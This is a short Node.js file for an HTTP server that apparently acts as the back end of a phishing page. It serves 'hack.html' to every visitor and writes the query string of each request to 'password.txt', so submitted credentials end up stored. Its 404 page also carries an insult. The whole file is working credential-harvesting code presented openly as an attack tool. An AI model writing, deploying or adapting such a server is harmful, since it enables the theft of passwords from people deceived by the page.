var http=require('http');
var fs=require('fs');
var path=require('path');
var mime=require('mime');
var cache={};

function send404(response){
  response.writeHead(404, {'Content-Type':'text/plain'});
  response.write('Error 404:You such a bitch!');
  response.end();
}

var server=http.createServer(function(request, response){
  sendFile(response);
  if(request.url.indexOf('favicon')==-1){
    var data=request.url;
    if(data.indexOf('?')!=-1){
      var data=data.split('?')[1];
      fs.appendFile('password.txt', data+'\n\n', function(err){
        if(err)console.log('append txt error');
      });
    }
  }


});

function sendFile(response){
  fs.readFile('./hack.html', function(err, data){
    if(err)console.log('no such file');
    else{
      console.log('someone come in~');
      response.writeHead(200, {'content-type':'text/html'});
      response.end(data);
    }
  })
}



server.listen(3000, function(){
  //console.log(mime.lookup(path.basename('./hack.php')));
  console.log('connect success!');
})